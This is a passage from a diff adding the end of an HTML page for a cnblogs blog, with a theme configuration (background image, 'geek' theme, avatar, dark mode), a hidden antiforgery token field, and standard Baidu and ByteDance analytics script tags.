+        value:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312133253_meiying.jpg',
+        opacity: 0.85,
+        repeat: true,
+    },
+    theme: {
+      name: 'geek',
+      avatar:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312125116_QQ%E5%9B%BE%E7%89%8720240807015716.jpg',
+    },
+    darkMode: {
+        enable: true,
+        darkDefault: false,
+    },
+  signature: {
+      enable: false,
+      contents: [
+      "",
+      ],
+    },
+  }
+  $.awesCnb(opts)
+</script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8Ow5-In01nBEvFwaadRGjqEa2nseROLMJRdxwB7GaUg2otS9mas3mdvS8G4Eyb_dI_0SUQJJUAN40PC7TPUeCi2QWWkTT5a0fZA0oWd3NwkLcuXCoyyd5RiT6ztdTaKH6iOsl8HsVuP_bcg5XhY5nRQ" />
+    <script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+<script defer src="https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?32d945448dd797af605da9156763de3dc11c9886368d0f917d6388e4fcf5542030632485602430134f60bc55ca391050b680e2741bf7233a8f1da9902314a3fa" id="ttzz"></script>
+</body>
+</html>
